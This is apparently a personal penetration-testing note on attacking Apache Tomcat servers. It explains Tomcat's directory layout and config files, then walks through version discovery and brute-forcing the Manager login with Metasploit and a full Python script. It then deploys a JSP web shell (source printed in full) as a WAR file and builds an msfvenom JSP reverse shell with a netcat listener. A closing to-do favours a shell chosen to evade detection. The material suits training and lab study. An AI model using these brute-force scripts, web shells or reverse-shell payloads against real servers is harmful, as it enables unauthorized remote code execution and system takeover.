---
created: 2026-07-19
tags:
  - web_hacking
status: incomplete
---
## Apache Tomcat

>[`Apache Tomcat`](https://tomcat.apache.org/) is an open-source web server that hosts applications written in Java.

- Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts. However, its popularity increased in Java-based frameworks and is now widely used by frameworks such as Spring and tools such as Gradle.
- By default, Apache Tomcat runs on `8080` for HTTP, `8443` for HTTPS, and `8009` for AJP (Apache JServ Protocol).

### General directory structure of a Tomcat installation

```bash
├── bin                   # scripts and binaries to start and run a Tomcat server
├── conf                  # configuration files
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml  # user credentials and their assigned roles
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib                   # JAR files for corrent functioning
├── logs                  # temporary log files
├── temp
├── webapps               # the default web root, hosts all applications
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work                  # cache, stores runtime data
    └── Catalina
        └── localhost
```

- Each folder inside `webapps` (i.e., each Tomcat application) has the following structure:

```bash
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp                 # Jakarta Server Pages (JSP)
    |   └── admin.jsp
    └── web.xml             # deployment descriptor
    └── lib                 # libraries for this specific application
    |    └── jdbc_drivers.jar
    └── classes             # compiled classes 
        └── AdminServlet.class
```

- The `WEB-INF/web.xml` file is known as the **deployment descriptor**. It stores information about the routes used by the application and classes that handle those routes.
- All compiled classes are stored in the `WEB-INF/classes` folder; they may contain important business logic and sensitive information.
-  The `jsp` folder stores [Jakarta Server Pages (JSP)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages), formerly known as `JavaServer Pages`.

>[!example]+ Example `web.xml`
> 
> ```xml
> <?xml version="1.0" encoding="ISO-8859-1"?>
> 
> <!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">
> 
> <web-app>
>   <servlet>
>     <servlet-name>AdminServlet</servlet-name>
>     <servlet-class>com.example.api.AdminServlet</servlet-class>
>   </servlet>
> 
>   <servlet-mapping>
>     <servlet-name>AdminServlet</servlet-name>
>     <url-pattern>/admin</url-pattern>
>   </servlet-mapping>
> </web-app>
> ```
> - The `web.xml` configuration above defines a new servlet named `AdminServlet` that is mapped to the class `com.example.api.AdminServlet`. 
> - Java uses the dot notation to create package names, which means the path for this class would be:
> ```
>  classes/com/example/api/AdminServlet.class
> ```
> - `<servlet-mapping>` defines that requests to `/admin` should be handled by `AdminServlet`, and there fore `AdminServlet.class` class.

> [!example]+ Example `tomcat-users.xml`
> 
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> 
> <SNIP>
>   
> <tomcat-users xmlns="http://tomcat.apache.org/xml"
>               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
>               xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
>               version="1.0">
> <!--
>   By default, no user is included in the "manager-gui" role required
>   to operate the "/manager/html" web application.  If you wish to use this app,
>   you must define such a user - the username and password are arbitrary.
> 
>   Built-in Tomcat manager roles:
>     - manager-gui    - allows access to the HTML GUI and the status pages
>     - manager-script - allows access to the HTTP API and the status pages
>     - manager-jmx    - allows access to the JMX proxy and the status pages
>     - manager-status - allows access to the status pages only
> 
>   The users below are wrapped in a comment and are therefore ignored. If you
>   wish to configure one or more of these users for use with the manager web
>   application, do not forget to remove the <!.. ..> that surrounds them. You
>   will also need to set the passwords to something appropriate.
> -->
> 
> <!-- ... -->
> 
> !-- user manager can access only manager section -->
> <role rolename="manager-gui" />
> <user username="tomcat" password="tomcat" roles="manager-gui" />
> 
> <!-- user admin can access manager and admin section both -->
> <role rolename="admin-gui" />
> <user username="admin" password="admin" roles="manager-gui,admin-gui" />
> 
> 
> </tomcat-users>
> ```
> 
> - `tomcat-users.xml` shows what each role (`manager-gui`, `manager-script`, `manager-jmx`, `manager-status`) provides access to, stores role mappings, and user credentials.

## Discovery & enumeration

- To detect Tomcat server version, accessing the `/docs` page (a default documentation page which may not be removed by administrators):

```bash
curl -s https://example.com:8180/docs/ | grep "Apache Tomcat" 
```

>[!example]-
> ```html
> <!-- ... -->
> <link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css">
> <title>Apache Tomcat 10 (10.0.10) - Documentation Index</title>
> <!-- ... -->
> ```

- Or try accessing a nonexistent page:

```bash
curl -s https://example.com/nonexistent
```

- File and directory enumeration:


```bash
ffuf -u http://example.com:8180/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -fc 301 -ic -c
```

>[!note] See [[Directory and file enumeration]].

## Tomcat Manager — login brute-force

- Access to `/manager` or `/host-manager` usually leads to RCE on the Tomcat server. After successful login, you can upload a [WAR (Web Application Resource or Web Application ARchive)](https://en.wikipedia.org/wiki/WAR_(file_format)) file with a JSP web shell to obtain code execution.
- To brute-force Tomcat Manager credentials, you can use the `scanner/http/tomcat_mgr_login` Metasploit module:

```bash
use scanner/http/tomcat_mgr_login
```

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST example.com
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 203.113.0.11
```

> [!note]-  `show options`
> ```bash
> [msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> show options
> ```
> ```bash
> Module options (auxiliary/scanner/http/tomcat_mgr_login):
> 
>    Name              Current Setting       Required  Description
>    ----              ---------------       --------  -----------
>    ANONYMOUS_LOGIN   false                 yes       Attempt to login with a blank us
>                                                      ername and password
>    BLANK_PASSWORDS   false                 no        Try blank passwords for all user
>                                                      s
>    BRUTEFORCE_SPEED  5                     yes       How fast to bruteforce, from 0 t
>                                                      o 5
>    DB_ALL_CREDS      false                 no        Try each user/password couple st
>                                                      ored in the current database
>    DB_ALL_PASS       false                 no        Add all passwords in the current
>                                                       database to the list
>    DB_ALL_USERS      false                 no        Add all users in the current dat
>                                                      abase to the list
>    DB_SKIP_EXISTING  none                  no        Skip existing credentials stored
>                                                       in the current database (Accept
>                                                      ed: none, user, user&realm)
>    PASSWORD                                no        The HTTP password to specify for
>                                                       authentication
>    PASS_FILE         /usr/share/metasploi  no        File containing passwords, one p
>                      t-framework/data/wor            er line
>                      dlists/tomcat_mgr_de
>                      fault_pass.txt
>    Proxies                                 no        A proxy chain of format type:hos
>                                                      t:port[,type:host:port][...]. Su
>                                                      pported proxies: socks4, socks5,
>                                                       socks5h, http, sapni
>    RHOSTS                                  yes       The target host(s), see https://
>                                                      docs.metasploit.com/docs/using-m
>                                                      etasploit/basics/using-metasploi
>                                                      t.html
>    RPORT             8080                  yes       The target port (TCP)
>    SSL               false                 no        Negotiate SSL/TLS for outgoing c
>                                                      onnections
>    STOP_ON_SUCCESS   false                 yes       Stop guessing when a credential
>                                                      works for a host
>    TARGETURI         /manager/html         yes       URI for Manager login. Default i
>                                                      s /manager/html
>    THREADS           1                     yes       The number of concurrent threads
>                                                       (max one per host)
>    USERNAME                                no        The HTTP username to specify for
>                                                       authentication
>    USERPASS_FILE     /usr/share/metasploi  no        File containing users and passwo
>                      t-framework/data/wor            rds separated by space, one pair
>                      dlists/tomcat_mgr_de             per line
>                      fault_userpass.txt
>    USER_AS_PASS      false                 no        Try the username as the password
>                                                       for all users
>    USER_FILE         /usr/share/metasploi  no        File containing users, one per l
>                      t-framework/data/wor            ine
>                      dlists/tomcat_mgr_de
>                      fault_users.txt
>    VERBOSE           true                  yes       Whether to print output for all
>                                                      attempts
>    VHOST                                   no        HTTP server virtual host
> 
> 
> View the full module info with the info, or info -d command.
> ```

- Alternatively, you can use [this](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) Python script to achieve the same result:

```bash
python3 mgr_brute.py -U http://example.com:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

>[!note]- Script
> ```python
> #!/usr/bin/python
> 
> import requests
> from termcolor import cprint
> import argparse
> 
> parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")
> 
> parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
> parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
> parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
> parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")
> 
> args = parser.parse_args()
> 
> url = args.url
> uri = args.path
> users_file = args.usernames
> passwords_file = args.passwords
> 
> new_url = url + uri
> f_users = open(users_file, "rb")
> f_pass = open(passwords_file, "rb")
> usernames = [x.strip() for x in f_users]
> passwords = [x.strip() for x in f_pass]
> 
> cprint("\n[+] Atacking.....", "red", attrs = ['bold'])
> 
> for u in usernames:
>     for p in passwords:
>         r = requests.get(new_url,auth = (u, p))
> 
>         if r.status_code == 200:
>             cprint("\n[+] Success!!", "green", attrs = ['bold'])
>             cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
>             break
>     if r.status_code == 200:
>         break
> 
> if r.status_code != 200:
>     cprint("\n[+] Failed!!", "red", attrs = ['bold'])
>     cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
> #print r.status_code
> ```


### Uploading a web shell

- After logging in, the Manager application allows you to instantly deploy new applications by upload WAR files. To get code execution, you can upload a WAR with a web shell; a WAR file can be created by `zip`-ing a JSP file. 
- You can use a simple JSP shell found at [`SecLists/Web-Shells/JSP/simple-shell.jsp`](https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/JSP/simple-shell.jsp):

>[!note]+ JSP code
> ```jsp
> <% 
> Runtime.getRuntime().exec(request.getParameter("cmd"));
> %>
> ```

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Web-Shells/JSP/simple-shell.jsp
```

- Or something like [`tennc/webshell/fuzzdb-webshell/jsp/cmd.jsp`](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp):

>[!note]- JSP code 
>  ```jsp
>  <%@ page import="java.util.*,java.io.*"%>
> <%
> //
> // JSP_KIT
> //
> // cmd.jsp = Command Execution (unix)
> //
> // by: Unknown
> // modified: 27/06/2003
> //
> %>
> <HTML><BODY>
> <FORM METHOD="GET" NAME="myform" ACTION="">
> <INPUT TYPE="text" NAME="cmd">
> <INPUT TYPE="submit" VALUE="Send">
> </FORM>
> <pre>
> <%
> if (request.getParameter("cmd") != null) {
>         out.println("Command: " + request.getParameter("cmd") + "<BR>");
>         Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
>         OutputStream os = p.getOutputStream();
>         InputStream in = p.getInputStream();
>         DataInputStream dis = new DataInputStream(in);
>         String disr = dis.readLine();
>         while ( disr != null ) {
>                 out.println(disr); 
>                 disr = dis.readLine(); 
>                 }
>         }
> %>
> </pre>
> </BODY></HTML>
>  ```

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
```

- `zip` it:

```bash
zip -r backup.war cmd.jsp
```

- Then upload the file using the GUI wizard and `Deploy`. You can access the shell from the server in the respective application (e.g., `http://example.com:8180/backup/cmd.jsp`) and execute commands:

```bash
curl http://example.com:8180/backup/cmd.jsp?cmd=id
```

>[!tip] To clean up afterwards, go back to Tomcat Manager and `Undeploy`.

- You can also use `msfvenom` to generate WAR files. `java/jsp_shell_reverse_tcp` is JSP reverse shell you can use:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

```bash
nc -lvnp 4443
```

## References and further reading

- [`Jarakta Server Pages — Wikipedia`](https://en.wikipedia.org/wiki/Jakarta_Server_Pages)
- [`WAR (file format) — Wikipedia`](https://en.wikipedia.org/wiki/WAR_(file_format))

>[!note]- TODO
> - Add this: 
> 	- [This](https://github.com/SecurityRiskAdvisors/cmd.jsp) JSP web shell is very lightweight (under 1kb) and utilizes a [Bookmarklet](https://www.freecodecamp.org/news/what-are-bookmarklets/) or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded `cmd.jsp` would render nothing. This is an excellent option to minimize our footprint and possibly evade detection for standard JSP web shells (though the JSP code may need to be modified a bit).
> - `GhostCat` 